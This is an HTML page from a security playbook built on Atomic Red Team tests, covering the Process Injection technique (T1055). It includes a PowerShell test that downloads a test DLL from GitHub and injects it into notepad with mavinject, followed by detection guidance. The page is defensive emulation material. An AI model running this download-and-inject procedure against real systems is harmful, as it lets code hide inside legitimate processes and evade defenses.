

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta charset="utf-8" />
    <title>T1055 - Process Injection &#8212; The Atomic Playbook</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous">
    <link href="../../_static/css/index.css" rel="stylesheet">
    <link rel="stylesheet" href="../../_static/sphinx-book-theme.css" type="text/css" />
    <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
    <link rel="stylesheet" type="text/css" href="../../_static/togglebutton.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/copybutton.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/mystnb.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/sphinx-thebe.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/jupyter-sphinx.css" />
    <script id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
    <script src="../../_static/sphinx-book-theme.js"></script>
    <script src="../../_static/jquery.js"></script>
    <script src="../../_static/underscore.js"></script>
    <script src="../../_static/doctools.js"></script>
    <script src="../../_static/language_data.js"></script>
    <script src="../../_static/togglebutton.js"></script>
    <script src="../../_static/clipboard.min.js"></script>
    <script src="../../_static/copybutton.js"></script>
    <script src="../../_static/mystnb.js"></script>
    <script src="../../_static/sphinx-book-theme.js"></script>
    <script >var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/require.js/2.3.4/require.min.js"></script>
    <script src="https://unpkg.com/@jupyter-widgets/html-manager@^0.18.0/dist/embed-amd.js"></script>
    <script async="async" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
    <script async="async" src="https://unpkg.com/thebelab@latest/lib/index.js"></script>
    <script >
        const thebe_selector = ".thebe"
        const thebe_selector_input = "pre"
        const thebe_selector_output = ".output"
    </script>
    <script async="async" src="../../_static/sphinx-thebe.js"></script>
    <link rel="index" title="Index" href="../../genindex.html" />
    <link rel="search" title="Search" href="../../search.html" />
    <link rel="next" title="T1484 - Group Policy Modification" href="T1484.html" />
    <link rel="prev" title="T1068 - Exploitation for Privilege Escalation" href="T1068.html" />

    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="docsearch:language" content="en">



  </head>
  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="80">
    

    <div class="container-xl">
      <div class="row">
          
<div class="col-12 col-md-3 bd-sidebar site-navigation show" id="site-navigation">
    
        <div class="navbar-brand-box">
<a class="navbar-brand text-wrap" href="../../index.html">
  
  <img src="../../_static/logo.png" class="logo" alt="logo">
  
  
  <h1 class="site-logo" id="site-title">The Atomic Playbook</h1>
  
</a>
</div>

<form class="bd-search d-flex align-items-center" action="../../search.html" method="get">
  <i class="icon fas fa-search"></i>
  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
</form>

<nav class="bd-links" id="bd-docs-nav" aria-label="Main navigation">
  <ul class="nav sidenav_l1">
 <li class="toctree-l1">
  <a class="reference internal" href="../../intro.html">
   Welcome to the Atomic Playbook
  </a>
 </li>
</ul>
<ul class="current nav sidenav_l1">
 <li class="toctree-l1">
  <a class="reference internal" href="../initial-access.html">
   Initial Access
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../execution.html">
   Execution
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../persistence.html">
   Persistence
  </a>
 </li>
 <li class="toctree-l1 current active">
  <a class="reference internal" href="../privilege-escalation.html">
   Privilege Escalation
  </a>
  <ul class="current">
   <li class="toctree-l2">
    <a class="reference internal" href="T1548.002.html">
     T1548.002 - Abuse Elevation Control Mechanism: Bypass User Access Control
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.008.html">
     T1546.008 - Event Triggered Execution: Accessibility Features
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.011.html">
     T1546.011 - Event Triggered Execution: Application Shimming
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1055.009.html">
     T1055.009 - Proc Memory
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.013.html">
     T1546.013 - Event Triggered Execution: PowerShell Profile
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1547.html">
     T1547 - Boot or Logon Autostart Execution
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1547.009.html">
     T1547.009 - Boot or Logon Autostart Execution: Shortcut Modification
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1055.012.html">
     T1055.012 - Process Injection: Process Hollowing
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1543.004.html">
     T1543.004 - Create or Modify System Process: Launch Daemon
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1547.010.html">
     T1547.010 - Port Monitors
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1574.012.html">
     T1574.012 - Hijack Execution Flow: COR_PROFILER
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1548.004.html">
     T1548.004 - Elevated Execution with Prompt
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1543.html">
     T1543 - Create or Modify System Process
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1037.html">
     T1037 - Boot or Logon Initialization Scripts
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1574.009.html">
     T1574.009 - Hijack Execution Flow: Path Interception by Unquoted Path
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.015.html">
     T1546.015 - Component Object Model Hijacking
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1543.002.html">
     T1543.002 - Create or Modify System Process: Systemd Service
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1574.010.html">
     T1574.010 - Hijack Execution Flow: Services File Permissions Weakness
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1055.014.html">
     T1055.014 - VDSO Hijacking
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1547.008.html">
     T1547.008 - LSASS Driver
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.html">
     T1546 - Event Triggered Execution
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.012.html">
     T1546.012 - Event Triggered Execution: Image File Execution Options Injection
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1547.011.html">
     T1547.011 - Boot or Logon Autostart Execution: Plist Modification
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1548.001.html">
     T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1053.html">
     T1053 - Scheduled Task/Job
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1055.013.html">
     T1055.013 - Process Doppelgänging
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.009.html">
     T1546.009 - AppCert DLLs
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1055.011.html">
     T1055.011 - Extra Window Memory Injection
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1134.html">
     T1134 - Access Token Manipulation
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1548.003.html">
     T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1055.008.html">
     T1055.008 - Ptrace System Calls
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.010.html">
     T1546.010 - Event Triggered Execution: AppInit DLLs
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.014.html">
     T1546.014 - Event Triggered Execution: Emond
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1034.html">
     T1034 - Path Interception
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1574.008.html">
     T1574.008 - Path Interception by Search Order Hijacking
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1574.011.html">
     T1574.011 - Hijack Execution Flow: Services Registry Permissions Weakness
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1068.html">
     T1068 - Exploitation for Privilege Escalation
    </a>
   </li>
   <li class="toctree-l2 current active">
    <a class="current reference internal" href="#">
     T1055 - Process Injection
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1484.html">
     T1484 - Group Policy Modification
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1543.003.html">
     T1543.003 - Create or Modify System Process: Windows Service
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1543.001.html">
     T1543.001 - Create or Modify System Process: Launch Agent
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1055.002.html">
     T1055.002 - Portable Executable Injection
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1574.006.html">
     T1574.006 - Hijack Execution Flow: LD_PRELOAD
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1134.004.html">
     T1134.004 - Access Token Manipulation: Parent PID Spoofing
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1037.003.html">
     T1037.003 - Network Logon Script
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.003.html">
     T1546.003 - Event Triggered Execution: Windows Management Instrumentation Event Subscription
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1078.003.html">
     T1078.003 - Local Accounts
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1053.004.html">
     T1053.004 - Scheduled Task/Job: Launchd
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1078.001.html">
     T1078.001 - Valid Accounts: Default Accounts
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.001.html">
     T1546.001 - Event Triggered Execution: Change Default File Association
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1037.001.html">
     T1037.001 - Boot or Logon Initialization Scripts: Logon Script (Windows)
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1547.002.html">
     T1547.002 - Authentication Package
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1574.004.html">
     T1574.004 - Dylib Hijacking
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1547.006.html">
     T1547.006 - Boot or Logon Autostart Execution: Kernel Modules and Extensions
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1037.005.html">
     T1037.005 - Boot or Logon Initialization Scripts: Startup Items
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1548.html">
     T1548 - Abuse Elevation Control Mechanism
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1134.002.html">
     T1134.002 - Create Process with Token
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1055.004.html">
     T1055.004 - Process Injection: Asynchronous Procedure Call
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1053.002.html">
     T1053.002 - Scheduled Task/Job: At (Windows)
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.005.html">
     T1546.005 - Event Triggered Execution: Trap
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.007.html">
     T1546.007 - Event Triggered Execution: Netsh Helper DLL
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1574.002.html">
     T1574.002 - Hijack Execution Flow: DLL Side-Loading
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1547.004.html">
     T1547.004 - Boot or Logon Autostart Execution: Winlogon Helper DLL
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1055.001.html">
     T1055.001 - Dynamic-link Library Injection
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1574.005.html">
     T1574.005 - Executable Installer File Permissions Weakness
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1547.003.html">
     T1547.003 - Time Providers
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1547.001.html">
     T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1037.002.html">
     T1037.002 - Boot or Logon Initialization Scripts: Logon Script (Mac)
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1055.003.html">
     T1055.003 - Thread Execution Hijacking
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1574.007.html">
     T1574.007 - Path Interception by PATH Environment Variable
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1134.005.html">
     T1134.005 - SID-History Injection
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1053.005.html">
     T1053.005 - Scheduled Task/Job: Scheduled Task
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1078.002.html">
     T1078.002 - Domain Accounts
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.002.html">
     T1546.002 - Event Triggered Execution: Screensaver
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1053.001.html">
     T1053.001 - Scheduled Task/Job: At (Linux)
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.006.html">
     T1546.006 - LC_LOAD_DYLIB Addition
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1547.005.html">
     T1547.005 - Boot or Logon Autostart Execution: Security Support Provider
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1134.001.html">
     T1134.001 - Token Impersonation/Theft
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1078.html">
     T1078 - Valid Accounts
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1134.003.html">
     T1134.003 - Make and Impersonate Token
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1055.005.html">
     T1055.005 - Thread Local Storage
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1574.001.html">
     T1574.001 - Hijack Execution Flow: DLL Search Order Hijacking
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1547.007.html">
     T1547.007 - Boot or Logon Autostart Execution: Re-opened Applications
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1574.html">
     T1574 - Hijack Execution Flow
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1037.004.html">
     T1037.004 - Boot or Logon Initialization Scripts: Rc.common
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.004.html">
     T1546.004 - Event Triggered Execution: .bash_profile and .bashrc
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1078.004.html">
     T1078.004 - Cloud Accounts
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1053.003.html">
     T1053.003 - Scheduled Task/Job: Cron
    </a>
   </li>
  </ul>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../defense-evasion.html">
   Defense Evasion
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../credential-access.html">
   Credential Access
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../discovery.html">
   Discovery
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../lateral-movement.html">
   Lateral Movement
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../collection.html">
   Collection
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../command-and-control.html">
   Command and Control
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../exfiltration.html">
   Exfiltration
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../impact.html">
   Impact
  </a>
 </li>
</ul>

</nav>

 <!-- To handle the deprecated key -->

<div class="navbar_extra_footer">
  Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
</div>

</div>


          


          
<main class="col py-md-3 pl-md-4 bd-content overflow-auto" role="main">
    
    <div class="row topbar fixed-top container-xl">
    <div class="col-12 col-md-3 bd-topbar-whitespace site-navigation show">
    </div>
    <div class="col pl-2 topbar-main">
        
        <button id="navbar-toggler" class="navbar-toggler ml-0" type="button" data-toggle="collapse"
            data-toggle="tooltip" data-placement="bottom" data-target=".site-navigation" aria-controls="navbar-menu"
            aria-expanded="true" aria-label="Toggle navigation" aria-controls="site-navigation"
            title="Toggle navigation" data-toggle="tooltip" data-placement="left">
            <i class="fas fa-bars"></i>
            <i class="fas fa-arrow-left"></i>
            <i class="fas fa-arrow-up"></i>
        </button>
        
        <div class="dropdown-buttons-trigger">
    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn" aria-label="Download this page"><i
            class="fas fa-download"></i></button>

    
    <div class="dropdown-buttons">
        <!-- ipynb file if we had a myst markdown file -->
        
        <!-- Download raw file -->
        <a class="dropdown-buttons" href="../../_sources/tactics/privilege-escalation/T1055.ipynb"><button type="button"
                class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
                data-placement="left">.ipynb</button></a>
        <!-- Download PDF via print -->
        <button type="button" id="download-print" class="btn btn-secondary topbarbtn" title="Print to PDF"
            onClick="window.print()" data-toggle="tooltip" data-placement="left">.pdf</button>
    </div>
    
</div>
        <!-- Source interaction buttons -->


        <!-- Full screen (wrap in <a> to have style consistency -->
        <a class="full-screen-button"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip"
                data-placement="bottom" onclick="toggleFullScreen()" title="Fullscreen mode"><i
                    class="fas fa-expand"></i></button></a>

        <!-- Launch buttons -->

    </div>

    <!-- Table of contents -->
    <div class="d-none d-md-block col-md-2 bd-toc show">
        <div class="tocsection onthispage pt-5 pb-3">
            <i class="fas fa-list"></i> Contents
        </div>
        <nav id="bd-toc-nav">
            <ul class="nav section-nav flex-column">
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#atomic-tests">
   Atomic Tests
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#atomic-test-1-process-injection-via-mavinject-exe">
     Atomic Test #1 - Process Injection via mavinject.exe
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#dependencies-run-with-powershell">
       Dependencies:  Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         powershell
        </span>
       </code>
       !
      </a>
      <ul class="nav section-nav flex-column">
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#description-utility-to-inject-must-exist-on-disk-at-specified-location-dll-payload">
         Description: Utility to inject must exist on disk at specified location (#{dll_payload})
        </a>
       </li>
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#check-prereq-commands">
         Check Prereq Commands:
        </a>
       </li>
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#get-prereq-commands">
         Get Prereq Commands:
        </a>
       </li>
      </ul>
     </li>
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#attack-commands-run-with-powershell">
       Attack Commands: Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         powershell
        </span>
       </code>
      </a>
     </li>
    </ul>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#detection">
   Detection
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#shield-active-defense">
   Shield Active Defense
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#security-controls">
     Security Controls
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#opportunity">
       Opportunity
      </a>
     </li>
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#use-case">
       Use Case
      </a>
     </li>
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#procedures">
       Procedures
      </a>
     </li>
    </ul>
   </li>
  </ul>
 </li>
</ul>

        </nav>
    </div>
</div>
    <div id="main-content" class="row">
        <div class="col-12 col-md-9 pl-md-3 pr-md-0">
        
              <div>
                
  <div class="section" id="t1055-process-injection">
<h1>T1055 - Process Injection<a class="headerlink" href="#t1055-process-injection" title="Permalink to this headline">¶</a></h1>
<p>Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process’s memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.</p>
<p>There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific.</p>
<p>More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.</p>
<div class="section" id="atomic-tests">
<h2>Atomic Tests<a class="headerlink" href="#atomic-tests" title="Permalink to this headline">¶</a></h2>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#Import the Module before running the tests.</span>
<span class="c1"># Checkout Jupyter Notebook at https://github.com/haresudhan/TheAtomicPlaybook to run PS scripts.</span>
<span class="n">Import</span><span class="o">-</span><span class="n">Module</span> <span class="o">/</span><span class="n">Users</span><span class="o">/</span><span class="mh">0x6c</span><span class="o">/</span><span class="n">AtomicRedTeam</span><span class="o">/</span><span class="n">atomics</span><span class="o">/</span><span class="n">invoke</span><span class="o">-</span><span class="n">atomicredteam</span><span class="o">/</span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicRedTeam</span><span class="o">.</span><span class="n">psd1</span> <span class="o">-</span> <span class="n">Force</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="atomic-test-1-process-injection-via-mavinject-exe">
<h3>Atomic Test #1 - Process Injection via mavinject.exe<a class="headerlink" href="#atomic-test-1-process-injection-via-mavinject-exe" title="Permalink to this headline">¶</a></h3>
<p>Windows 10 Utility To Inject DLLS.</p>
<p>Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
With default arguments, expect to see a MessageBox, with notepad’s icon in taskbar.</p>
<p><strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)</p>
<div class="section" id="dependencies-run-with-powershell">
<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#dependencies-run-with-powershell" title="Permalink to this headline">¶</a></h4>
<div class="section" id="description-utility-to-inject-must-exist-on-disk-at-specified-location-dll-payload">
<h5>Description: Utility to inject must exist on disk at specified location (#{dll_payload})<a class="headerlink" href="#description-utility-to-inject-must-exist-on-disk-at-specified-location-dll-payload" title="Permalink to this headline">¶</a></h5>
</div>
<div class="section" id="check-prereq-commands">
<h5>Check Prereq Commands:<a class="headerlink" href="#check-prereq-commands" title="Permalink to this headline">¶</a></h5>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1055</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">x64</span><span class="p">\</span><span class="n">T1055</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
</pre></div>
</div>
</div>
<div class="section" id="get-prereq-commands">
<h5>Get Prereq Commands:<a class="headerlink" href="#get-prereq-commands" title="Permalink to this headline">¶</a></h5>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Type</span> <span class="n">Directory</span> <span class="p">(</span><span class="nb">split-path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1055</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">x64</span><span class="p">\</span><span class="n">T1055</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span> <span class="n">-ErrorAction</span> <span class="n">ignore</span> <span class="p">|</span> <span class="nb">Out-Null</span>
<span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;PathToAtomicsFolder\T1055\src\x64\T1055.dll&quot;</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1055</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">1</span> <span class="o">-</span><span class="n">GetPreReqs</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="attack-commands-run-with-powershell">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$mypid</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Start-Process</span> <span class="n">notepad</span> <span class="n">-PassThru</span><span class="p">).</span><span class="n">id</span>
<span class="n">mavinject</span> <span class="nv">$mypid</span> <span class="p">/</span><span class="n">INJECTRUNNING</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1055</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">x64</span><span class="p">\</span><span class="n">T1055</span><span class="p">.</span><span class="n">dll</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1055</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">1</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="detection">
<h2>Detection<a class="headerlink" href="#detection" title="Permalink to this headline">¶</a></h2>
<p>Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, <code>QueueUserAPC</code>/<code>NtQueueApcThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Endgame Process Injection July 2017)</p>
<p>Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process.</p>
<p>Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits)</p>
<p>Monitor for named pipe creation and connection events (Event IDs 17 and 18) for possible indicators of infected processes with external modules.(Citation: Microsoft Sysmon v6 May 2017)</p>
<p>Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.</p>
</div>
<div class="section" id="shield-active-defense">
<h2>Shield Active Defense<a class="headerlink" href="#shield-active-defense" title="Permalink to this headline">¶</a></h2>
<div class="section" id="security-controls">
<h3>Security Controls<a class="headerlink" href="#security-controls" title="Permalink to this headline">¶</a></h3>
<p>Alter security controls to make the system more or less vulnerable to attack.</p>
<p>Manipulating security controls involves making configuration changes to the security settings of a system including things like modifying Group Policies, disabling/enabling autorun for removable media, and tightening or relaxing system firewalls, etc.</p>
<div class="section" id="opportunity">
<h4>Opportunity<a class="headerlink" href="#opportunity" title="Permalink to this headline">¶</a></h4>
<p>In an adversary engagement scenario, there is an opportunity to implement security controls to support your defensive objectives over a prolonged engagement.</p>
</div>
<div class="section" id="use-case">
<h4>Use Case<a class="headerlink" href="#use-case" title="Permalink to this headline">¶</a></h4>
<p>A defender could implement security controls to have an effect on process injection techniques such as AppLocker or an Antivirus/EDR tool designed to watch for CreateRemoteThread events.</p>
</div>
<div class="section" id="procedures">
<h4>Procedures<a class="headerlink" href="#procedures" title="Permalink to this headline">¶</a></h4>
<p>Weaken security controls on a system to allow for leaking of credentials via network connection poisoning.
Implement policies on a system to prevent the insecure storage of passwords in the registry. This may force an adversary to revert these changes or find another way to access cached credentials.</p>
</div>
</div>
</div>
</div>

    <script type="text/x-thebe-config">
    {
        requestKernel: true,
        binderOptions: {
            repo: "binder-examples/jupyter-stacks-datascience",
            ref: "master",
